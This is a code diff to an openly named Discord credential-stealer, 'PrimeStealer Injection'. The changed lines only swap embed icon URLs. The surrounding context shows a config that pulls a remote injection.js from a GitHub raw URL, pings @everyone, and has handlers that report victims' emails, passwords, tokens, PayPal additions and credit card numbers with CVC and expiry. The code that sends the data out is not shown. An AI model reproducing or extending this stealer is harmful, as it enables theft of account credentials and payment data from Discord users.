@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'PrimeStealer Injection', 
-  embed_icon: 'https://media.discordapp.net/attachments/1145210470077317140/1220877104065810443/prime.png?ex=66108968&is=65fe1468&hm=8f2b7f1e8c21a77ad7a5ba12a9dab67ecd34ec900c95dd63e2a47e8600bb83d8&=&format=webp&quality=lossless&width=192&height=192'.replace(/ /g, '%20'), 
+  embed_icon: 'https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/DecariusWoods1/index/main/injection.js', 
   /**
@@ -681,7 +681,7 @@ const login = async (email, password, token) => {
         },
         footer: {
             text: 'PrimeStealer Injection | github.com/SheLuvDx/PrimeStealer',
-            icon_url: "https://media.discordapp.net/attachments/1145210470077317140/1220877104065810443/prime.png?ex=66108968&is=65fe1468&hm=8f2b7f1e8"
+            icon_url: "https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg"
         },
       },
     ],
@@ -724,7 +724,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         },
         footer: {
             text: 'PrimeStealer Injection | github.com/SheLuvDx/PrimeStealer',
-            icon_url: "https://media.discordapp.net/attachments/1145210470077317140/1220877104065810443/prime.png?ex=66108968&is=65fe1468&hm=8f2b7f1e8"
+            icon_url: "https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg"
         },
       },
     ],
@@ -767,7 +767,7 @@ const emailChanged = async (email, password, token) => {
         },
         footer: {
             text: 'PrimeStealer Injection | github.com/SheLuvDx/PrimeStealer',
-            icon_url: "https://media.discordapp.net/attachments/1145210470077317140/1220877104065810443/prime.png?ex=66108968&is=65fe1468&hm=8f2b7f1e8"
+            icon_url: "https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg"
         },
       },
     ],
@@ -810,7 +810,7 @@ const PaypalAdded = async (token) => {
         },
         footer: {
             text: 'PrimeStealer Injection | github.com/SheLuvDx/PrimeStealer',
-            icon_url: "https://media.discordapp.net/attachments/1145210470077317140/1220877104065810443/prime.png?ex=66108968&is=65fe1468&hm=8f2b7f1e8"
+            icon_url: "https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg"
         },
       },
     ],
@@ -853,7 +853,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         },
         footer: {
             text: 'PrimeStealer Injection | github.com/SheLuvDx/PrimeStealer',
-            icon_url: "https://media.discordapp.net/attachments/1145210470077317140/1220877104065810443/prime.png?ex=66108968&is=65fe1468&hm=8f2b7f1e8"
+            icon_url: "https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg"
         },
       },
     ],
@@ -898,7 +898,7 @@ const nitroBought = async (token) => {
         },
         footer: {
             text: 'PrimeStealer Injection | github.com/SheLuvDx/PrimeStealer',
-            icon_url: "https://media.discordapp.net/attachments/1145210470077317140/1220877104065810443/prime.png?ex=66108968&is=65fe1468&hm=8f2b7f1e8"
+            icon_url: "https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg"
         },
       },
     ],
